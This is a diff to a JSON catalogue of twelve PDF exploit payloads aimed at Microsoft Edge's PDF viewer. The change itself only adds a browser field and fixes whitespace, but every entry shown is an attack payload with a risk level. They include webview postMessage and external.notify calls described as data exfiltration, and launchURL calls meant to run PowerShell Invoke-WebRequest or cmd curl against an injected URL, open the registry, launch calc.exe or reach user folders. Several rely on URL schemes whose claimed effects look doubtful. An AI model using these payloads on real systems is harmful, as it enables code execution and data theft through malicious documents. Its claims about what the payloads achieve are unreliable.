@@ -6,7 +6,7 @@
     "total_payloads": 12,
     "categories": [
       "windows_integration",
-      "webview_exploit", 
+      "webview_exploit",
       "registry_manipulation",
       "file_system"
     ],
@@ -24,15 +24,17 @@
       "technique": "webview_postmessage",
       "payload": "window.chrome.webview.postMessage('{url}');",
       "description": "Edge PDF WebView postMessage exploitation",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "edge"
     },
     {
       "id": "edge_002",
-      "category": "webview_exploit", 
+      "category": "webview_exploit",
       "technique": "external_notify",
       "payload": "window.external.notify('{url}');",
       "description": "Edge PDF external notify method for data exfiltration",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "edge"
     },
     {
       "id": "edge_003",
@@ -40,7 +42,8 @@
       "technique": "settings_privacy_access",
       "payload": "app.launchURL('ms-settings:privacy-webcam?url={url}', true);",
       "description": "Edge PDF Windows Settings privacy access with parameter injection",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "edge"
     },
     {
       "id": "edge_004",
@@ -48,7 +51,8 @@
       "technique": "available_networks",
       "payload": "app.launchURL('ms-availablenetworks:?target={url}', true);",
       "description": "Edge PDF Windows available networks access with URL injection",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "edge"
     },
     {
       "id": "edge_005",
@@ -56,7 +60,8 @@
       "technique": "power_settings",
       "payload": "app.launchURL('ms-settings-power:?exploit={url}', true);",
       "description": "Edge PDF Windows power settings access with parameter injection",
-      "risk_level": "low"
+      "risk_level": "low",
+      "browser": "edge"
     },
     {
       "id": "edge_006",
@@ -64,7 +69,8 @@
       "technique": "apps_folder_access",
       "payload": "app.launchURL('shell:AppsFolder?url={url}', true);",
       "description": "Edge PDF Windows Apps folder access with URL parameter",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "edge"
     },
     {
       "id": "edge_007",
@@ -72,7 +78,8 @@
       "technique": "registry_edge_access",
       "payload": "app.launchURL('regedit://HKEY_CURRENT_USER/Software/Microsoft/Edge?url={url}', true);",
       "description": "Edge PDF Windows Registry access attempt with URL injection",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "edge"
     },
     {
       "id": "edge_008",
@@ -80,7 +87,8 @@
       "technique": "powershell_execution",
       "payload": "app.launchURL('powershell://Invoke-WebRequest -Uri {url}', true);",
       "description": "Edge PDF PowerShell execution via URL scheme",
-      "risk_level": "critical"
+      "risk_level": "critical",
+      "browser": "edge"
     },
     {
       "id": "edge_009",
@@ -88,7 +96,8 @@
       "technique": "cmd_execution",
       "payload": "app.launchURL('cmd://curl {url}', true);",
       "description": "Edge PDF command prompt execution via URL scheme",
-      "risk_level": "critical"
+      "risk_level": "critical",
+      "browser": "edge"
     },
     {
       "id": "edge_010",
@@ -96,7 +105,8 @@
       "technique": "windows_store_apps",
       "payload": "app.launchURL('ms-windows-store://pdp/?ProductId=exploit&url={url}', true);",
       "description": "Edge PDF Windows Store app access with URL parameter injection",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "edge"
     },
     {
       "id": "edge_011",
@@ -104,7 +114,8 @@
       "technique": "calculator_execution",
       "payload": "app.launchURL('file:///C:/Windows/System32/calc.exe?url={url}', true);",
       "description": "Edge PDF Windows Calculator execution with parameter injection",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "edge"
     },
     {
       "id": "edge_012",
@@ -112,7 +123,8 @@
       "technique": "public_documents_access",
       "payload": "app.launchURL('file:///C:/Users/Public/Documents/?target={url}', true);",
       "description": "Edge PDF Windows Public Documents access with URL parameter",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "edge"
     }
   ]
 }
